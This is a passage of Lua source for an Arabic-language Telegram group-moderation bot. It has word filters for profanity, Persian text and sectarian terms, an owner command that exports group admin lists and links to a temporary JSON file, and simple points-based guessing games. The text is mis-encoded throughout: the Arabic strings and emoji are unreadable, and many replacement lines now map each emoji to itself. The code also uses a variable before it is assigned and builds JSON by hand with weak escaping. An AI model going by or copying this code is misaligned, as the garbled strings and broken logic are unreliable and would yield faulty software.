Dev_mfm(msg.chat_id_, msg.id_,  1, "β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© "..numadded..' Ψ±Ψ³Ψ§ΩΩ', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if Devmfm:get('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Devmfm:del('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Devmfm:get('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_mfm(msg.chat_id_, msg.id_,  1, "β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© "..numadded..' ΩΩΨ·Ω', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_)  
end
end
--     Source Escobar     --
if text and (text:match("Ψ·ΩΨ²") or text:match("Ψ―ΩΨ³") or text:match("Ψ§ΩΩΨ¬") or text:match("ΩΩΨ¬") or text:match("Ψ―ΩΩΨ³") or text:match("ΨΉΩΨ±") or text:match("ΩΨ³Ψ?ΨͺΩ") or text:match("ΩΨ³ΩΩ") or text:match("ΩΨ³Ψ±Ψ¨Ω") or text:match("Ψ¨ΩΨ§ΨΉ") or text:match("Ψ§Ψ¨Ω Ψ§ΩΨΉΩΩΨ±Ω") or text:match("ΩΩΩΩΨ¬") or text:match("ΩΨ­Ψ¨Ω") or text:match("ΩΨ­Ψ§Ψ¨") or text:match("Ψ§ΩΩΨ­Ψ¨Ω") or text:match("ΩΨ³Ω") or text:match("Ψ·ΩΨ²Ω") or text:match("ΩΨ³ Ψ§ΩΩ") or text:match("Ψ΅Ψ±Ω") or text:match("ΩΨ³ Ψ§Ψ?ΨͺΩ")) then
if not Devmfm:get(mustafa.."mfm:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« ΩΩΩΩΩΩΜΫΨΉ Ψ§ΩΩΨ΄Ψ§Ψ± ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
end end
if text and (text:match("Ϊ¬") or text:match("ΩΊ") or text:match("Ϊ") or text:match("Ϊ") or text:match("ΪΏ") or text:match("Ϊ") or text:match("Ϊ") or text:match("έ«") or text:match("Ϊ") or text:match("Ϊ") or text:match("έ") or text:match("ΪΈ") or text:match("ΩΎ") or text:match("Ϋ΄") or text:match("ΩΪ©") or text:match("Ψ²Ψ―Ω") or text:match("Ψ―Ψ?ΨͺΨ±Ψ§") or text:match("Ψ―ΫΩΨ«") or text:match("Ϊ©ΩΫΩΎΨ΄Ω") or text:match("Ψ?ΩΨ΄Ψ΄ΩΩ") or text:match("ΩΫΨ―Ψ§") or text:match("Ϊ©Ω") or text:match("Ψ¨Ψ―Ψ§ΩΫΩ") or text:match("Ψ¨Ψ§ΫΨ―") or text:match("Ψ²ΩΨ§Ψ΄ΩΫΫ") or text:match("Ψ’ΩΩΨ²Ψ΄") or text:match("Ψ±Ψ§Ψ­ΨͺΫ") or text:match("Ψ?Ψ³ΨͺΩ") or text:match("Ψ¨ΫΨ§Ω") or text:match("Ψ¨ΩΎΩΨ΄Ω") or text:match("ΩΨ±ΩΩ")) then
if Devmfm:get(mustafa.."mfm:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« ΩΩΩΩΩΩΜΫΨΉ Ψ§ΩΨͺΩΩΩ Ψ¨Ψ§ΩΨΊΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ ΩΩΩΨ’")  
end end
if text and (text:match("Ϊ¬") or text:match("ΩΊ") or text:match("Ϊ") or text:match("Ϊ") or text:match("ΪΏ") or text:match("Ϊ") or text:match("Ϊ") or text:match("έ«") or text:match("Ϊ") or text:match("Ϊ") or text:match("έ") or text:match("ΪΈ") or text:match("ΩΎ") or text:match("Ϋ΄") or text:match("ΩΪ©") or text:match("Ψ²Ψ―Ω") or text:match("Ψ―Ψ?ΨͺΨ±Ψ§") or text:match("Ψ―ΫΩΨ«") or text:match("Ϊ©ΩΫΩΎΨ΄Ω") or text:match("Ψ?ΩΨ΄Ψ΄ΩΩ") or text:match("ΩΫΨ―Ψ§") or text:match("Ϊ©Ω") or text:match("Ψ¨Ψ―Ψ§ΩΫΩ") or text:match("Ψ¨Ψ§ΫΨ―") or text:match("Ψ²ΩΨ§Ψ΄ΩΫΫ") or text:match("Ψ’ΩΩΨ²Ψ΄") or text:match("Ψ±Ψ§Ψ­ΨͺΫ") or text:match("Ψ?Ψ³ΨͺΩ") or text:match("Ψ¨ΫΨ§Ω") or text:match("Ψ¨ΩΎΩΨ΄Ω") or text:match("ΩΨ±ΩΩ")) then
if Devmfm:get(mustafa.."mfm:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("Ψ?Ψ±Ω Ψ¨Ψ§ΩΩΩ") or text:match("Ψ?Ψ¨Ψ±Ψ¨Ω") or text:match("ΩΨ³Ψ―ΩΩΨ±Ψ¨Ω") or text:match("Ψ?Ψ±Ψ¨ Ψ¨Ψ§ΩΩΩ") or text:match("Ψ?Ψ±Ψ¨ Ψ§ΩΩΩ") or text:match("Ψ?Ψ±Ω Ψ¨Ψ±Ψ¨Ω") or text:match("Ψ§ΩΩΩ Ψ§ΩΩΩΨ§Ψ―") or text:match("Ψ?Ψ±Ω Ψ¨ΩΨ­ΩΨ―") or text:match("ΩΨ³Ω Ψ§ΩΩΩ") or text:match("ΩΨ³Ω Ψ±Ψ¨Ω") or text:match("ΩΨ³Ψ±Ψ¨Ω") or text:match("ΩΨ³Ψ?ΨͺΨ§ΩΩΩ") or text:match("ΩΨ³Ψ?Ψͺ Ψ§ΩΩΩ") or text:match("Ψ?Ψ±Ω Ψ¨Ψ―ΩΩΩ") or text:match("Ψ?Ψ±ΩΨ¨Ψ―ΩΩΩ") or text:match("ΩΨ³Ψ§ΩΩΩ") or text:match("Ψ?Ψ±Ψ¨Ψ§ΩΩΩ")) then
if not Devmfm:get(mustafa.."mfm:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« ΩΩΩΩΩΩΜΫΨΉ Ψ§ΩΩΩΨ± ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©") 
end end
if text and (text:match("Ψ³ΩΩ ΩΩΨ³") or text:match("Ψ΄ΩΨΉΩ") or text:match("Ψ§ΩΨ΄ΩΨΉΩ") or text:match("Ψ§ΩΨ³ΩΩ") or text:match("Ψ·Ψ§Ψ¦ΩΨͺΩΩ") or text:match("Ψ΄ΩΨΉΩ") or text:match("Ψ§ΩΨ§ Ψ³ΩΩ") or text:match("ΩΨ³ΩΨ­Ω") or text:match("ΩΩΩΨ―Ω") or text:match("ΩΨ±Ψ―Ω") or text:match("ΩΩΨ­Ψ―") or text:match("Ψ¨Ψ§ΩΨ³ΩΩ") or text:match("Ψ΄ΩΨΉΨ©")) then
if not Devmfm:get(mustafa.."mfm:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","β β« ΩΩΩΩΩΩΜΫΨΉ Ψ§ΩΨͺΩΩΩ Ψ¨Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω ΩΩΩΨ’") 
end end
--     Source Escobar     --
if SecondSudo(msg) then
if text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ' and ChCheck(msg) or text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and ChCheck(msg) then
local List = Devmfm:smembers(mustafa..'mfm:Groups') 
local BotName = (Devmfm:get(mustafa.."mfm:NameBot") or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±')
local GetJson = '{"BotId": '..mustafa..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","")
LinkGroups = Devmfm:get(mustafa.."mfm:Groups:Links"..v)
Welcomes = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..v) or ''
mfmConstructors = Devmfm:smembers(mustafa..'mfm:mfmConstructor:'..v)
Constructors = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..v)
BasicConstructors = Devmfm:smembers(mustafa..'mfm:Constructor:'..v)
Managers = Devmfm:smembers(mustafa..'mfm:Managers:'..v)
Admis = Devmfm:smembers(mustafa..'mfm:Admins:'..v)
Vips = Devmfm:smembers(mustafa..'mfm:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #mfmConstructors ~= 0 then
GetJson = GetJson..'"mfmConstructors":['
for k,v in pairs(mfmConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..mustafa..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..mustafa..'.json', 'β β« ΩΨ­ΨͺΩΩ Ψ§ΩΩΩΩ ΨΉΩΩ β '..#List..' ΩΨ¬ΩΩΨΉΩ',dl_cb, nil)
io.popen('rm -rf ./'..mustafa..'.json')
end
if text == 'Ψ±ΩΨΉ Ψ§ΩΩΨ³Ψ?Ω' and tonumber(msg.reply_to_message_id_) > 0 or text == 'Ψ±ΩΨΉ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source Escobar     --
if Devmfm:get(mustafa.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_mfm( msg.chat_id_, msg.id_, 1,"β β« ΩΩΨ¬Ψ― ΩΩΨ· ( 6 ) Ψ§Ψ?ΨͺΩΨ§Ψ±Ψ§Ψͺ\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ?ΨͺΩΨ§Ψ±Ω ΩΨ±Ω Ψ§Ψ?Ψ±Ω", 1, "md")    
return false  end 
local GETNUM = Devmfm:get(mustafa.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Devmfm:del(mustafa.."SET:GAME"..msg.chat_id_)   
Dev_mfm( msg.chat_id_, msg.id_, 1,'β β« *Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ψ§ΩΩΨ― Ψ±ΩΩ* β '..NUM..'\nβ β« *ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΨ­Ψ΅ΩΨͺ ΨΉΩΩ 5 ΩΩΨ§Ψ· ΩΩΩΩΩ Ψ§Ψ³ΨͺΨ¨Ψ―Ψ§ΩΩΨ§ Ψ¨Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω*', 1, "md") 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Devmfm:del(mustafa.."SET:GAME"..msg.chat_id_)   
Dev_mfm( msg.chat_id_, msg.id_, 1,'β β« *Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ψ§ΩΩΨ― Ψ±ΩΩ* β '..GETNUM..'\nβ β« *ΩΩΨ§Ψ³Ω ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ Ψ­Ψ§ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ΩΩΨΉΨ«ΩΨ± ΨΉΩΩ Ψ§ΩΩΨ­ΩΨ¨Ψ³*', 1, "md")
end
end
end
if Devmfm:get(mustafa..'Devmfm4'..msg.sender_user_id_) then
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
send(msg.chat_id_, msg.id_, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±")
Devmfm:del(mustafa..'Devmfm4'..msg.sender_user_id_)
return false  end 
Devmfm:del(mustafa..'Devmfm4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, 'β β« Ψ§ΩΩΨΉΨ±Ω ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΩ°Ω ΩΩΨ§Ψ©')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ§ ΩΩΩΩΩ ΩΨΆΨΉ ΩΨΉΨ±Ω Ψ­Ψ³Ψ§Ψ¨Ψ§Ψͺ ΩΩΩΩ° Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ§ ΩΩΩΩΩ ΩΨΆΨΉ ΩΨΉΨ±Ω ΩΨ¬ΩΩΨΉΩ ΩΩΩΩ° Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'β β« Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ―ΩΩ ΩΩΩΩ° Ψ§ΩΩΩΨ§Ψ© \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω \nβ β« Ψ§ΩΨ―Ω Ψ§ΩΩΩΨ§Ψ© β '..data.id_..'\nβ β« ΩΨΉΨ±Ω Ψ§ΩΩΩΨ§Ψ© β [@'..data.type_.channel_.username_..']')
Devmfm:set(mustafa..'Devmfm2',data.id_)
Devmfm:set(mustafa..'Devmfm3','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΩΩΩ° Ψ§ΩΩΩΨ§Ψ©')
end
return false  
end
end,nil)
end
--     Source Escobar     --
if Devmfm:get(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Devmfm:del(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±', 1, 'md')
return false 
end 
Devmfm:del(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
Devmfm:set(mustafa.."DevText", DevText)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±", 1, "md")
end
if Devmfm:get(mustafa..'mfm:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Devmfm:del(mustafa..'mfm:NameBot'..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±', 1, 'md')
return false 
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ ', 1, 'html')
Devmfm:del(mustafa..'mfm:NameBot'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:NameBot', text)
return false 
end
--     Source Escobar     --
if text == "Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then
if not Devmfm:get(mustafa.."mfm:Lock:GpLinks"..msg.chat_id_) then 
if Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« πππππ ππππ β¬ β₯‘ \nββββ EB ββββ\n"..Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ΩΩΨ¬Ψ― Ψ±Ψ§Ψ¨Ψ· Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ· Ψ§Ω Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ΄Ψ§Ψ‘ Ψ±Ψ§Ψ¨Ψ· ΩΩΨ§ΩΨ΄Ψ§Ψ‘', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ¬ΩΨ¨ Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΩΩΨΉΩΨ·Ω', 1, 'md')
end
end
--     Source Escobar     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'Ψ¨ΩΨͺ' or text == 'Ψ¨ΩΨͺΨͺ' then 
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±')
local mustafaTEAM = {"ΩΨͺΩΩΩ Ψ¨ΩΨͺ Ψ§Ψ³ΩΩ "..NameBot.." ππͺ","Ψ§Ψ³ΩΩ Ψ§ΩΩΩΩΩ "..NameBot.." πβ₯οΈ","ΨΉΩΨ―Ω Ψ§Ψ³Ω ΨͺΨ±Ω ππ","Ψ΅ΩΨ­ΩΩΩ "..NameBot.." ΩΨ§ΩΩΩΩ° Ψ¨ΩΨͺ ππͺ","Ψ§ΩΨͺ Ψ§ΩΨ¨ΩΨͺ ΩΩ ππ"} 
Devmfm2 = math.random(#mustafaTEAM) 
Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM[Devmfm2] , 1, 'html') 
return false
end
if text == 'Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ' or text == 'Ψ§ΩΨ¨ΩΨͺ Ψ΄ΩΩ Ψ§Ψ³ΩΩ' or text == 'Ψ΄Ψ³ΩΩ Ψ§ΩΨ¨ΩΨͺ' or text == 'Ψ§ΩΨ¨ΩΨͺ Ψ΄Ψ³ΩΩ' then
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±') 
local mustafaTEAM = {"Ψ§Ψ³ΩΩ Ψ§ΩΩΩΩΩ "..NameBot.." πβ₯οΈ","ΩΩΨ§Ψ§ ΩΨ±ΩΨ­ΩΩ ΩΩΨ§ΩΩ "..NameBot.." π»β₯οΈ"} 
Devmfm2 = math.random(#mustafaTEAM) 
Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM[Devmfm2] , 1, 'html') 
return false
end
if text and text == (Devmfm:get(mustafa..'mfm:NameBot') or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±') then 
NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±')
local namebot = {'πΈβ₯οΈ ΩΩΨ§ ΩΩΨ¨Ω ΩΩΨ§Ω '..NameBot..' ΨͺΩΨΆΩ','ΨͺΨ±Ψ©Ω ΩΨ΅Ψ?ΨͺΩΨ§Ψ§ Ψ§Ψ­Ψ¬ΩΩ Ψ΄Ψ±Ψ§ΩΨ― πππ','Ψ§Ψ·ΩΩΩ ΩΨ§Ψ­Ψ―Ψ― ΩΨ΅ΩΨ­ '..NameBot..' π»β₯οΈ','Ψ?Ψ¨Ψ΅ΨͺΨͺ Ψ§ΩΩΨ©Ψ© Ψ΄ΨͺΨ±ΩΨ―Ψ― ΨΉΨ§Ψ§Ψ― π€§ππ'} 
name = math.random(#namebot) 
Dev_mfm(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='ΩΩΨ§Ψ·Ω' and ChCheck(msg) then 
if tonumber((Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'*β β« ΩΩ ΨͺΨ±Ψ¨Ψ­ Ψ§Ω ΩΩΨ·Ω*\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΩΨΉΨ¨', 1, 'md')
else 
Dev_mfm(msg.chat_id_, msg.id_, 1,'*β β« ΨΉΨ―Ψ― Ψ§ΩΩΩΨ§Ψ· Ψ§ΩΨͺΩ Ψ±Ψ¨Ψ­ΨͺΩΨ§ β * '..(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'Ψ­Ψ°Ω Ψ±Ψ³Ψ§Ψ¦ΩΩ' and ChCheck(msg) or text ==  'ΩΨ³Ψ­ Ψ±Ψ³Ψ§Ψ¦ΩΩ' and ChCheck(msg) then Devmfm:del(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ', 1, 'md') end
if text ==  'Ψ­Ψ°Ω ΩΩΨ§Ψ·Ω' and ChCheck(msg) or text ==  'ΩΨ³Ψ­ ΩΩΨ§Ψ·Ω' and ChCheck(msg) then Devmfm:del(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ ΩΩΨ’Ψ·Ϊͺ', 1, 'md') end
--     Source Escobar     --
if text == 'Ψ³ΩΨ§ΩΩΨ§Ψͺ' and ChCheck(msg) or text == 'Ψ§ΩΨ³ΩΨ§ΩΩΨ§Ψͺ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'π','π','π','π','π','π','π','π','π','π','π','π','π','π₯₯','π₯','π','π','π₯','π₯¦','π₯','πΆ','π½','π₯','π₯','π ','π₯','π','π₯','π₯¨','π§','π₯','π³','π₯','π₯','π₯©','π','π','π­','π','π','π','π₯ͺ','π₯','πΌ','βοΈ','π΅','π₯€','πΆ','πΊ','π»','π','β½οΈ','π','βΎοΈ','πΎ','π','π','π±','π','πΈ','π₯','π°','π?','π³','π―','π','π»','πΈ','πΊ','π₯','πΉ','πΌ','π§','π€','π¬','π¨','π­','πͺ','π','π€','π','π΅','π','π','π₯','π·','π','π','π','π','π','π','π','π','π','π','π','π?πΆ','βοΈ','π‘','π?','π‘','π£','β±','π’','π','π','π','π','πͺ','π«','π¬','π­','β°','πΊ','π','βοΈ','π‘'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'π','π')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π₯¨','π₯¨')
name = string.gsub(name,'π§','π§')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π³','π³')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π₯©','π₯©')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π­','π­')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π₯ͺ','π₯ͺ')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'πΌ','πΌ')
name = string.gsub(name,'βοΈ','βοΈ')
name = string.gsub(name,'π΅','π΅')
name = string.gsub(name,'π₯€','π₯€')
name = string.gsub(name,'πΆ','πΆ')
name = string.gsub(name,'πΊ','πΊ')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π₯₯','π₯₯')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π₯¦','π₯¦')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'πΆ','πΆ')
name = string.gsub(name,'π½','π½')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π ','π ')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π»','π»')
name = string.gsub(name,'π','π')
name = string.gsub(name,'β½οΈ','β½οΈ')
name = string.gsub(name,'π','π')
name = string.gsub(name,'βΎοΈ','βΎοΈ')
name = string.gsub(name,'πΎ','πΎ')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π±','π±')
name = string.gsub(name,'π','π')
name = string.gsub(name,'πΈ','πΈ')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π°','π°')
name = string.gsub(name,'π?','π?')
name = string.gsub(name,'π³','π³')
name = string.gsub(name,'π―','π―')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π»','π»')
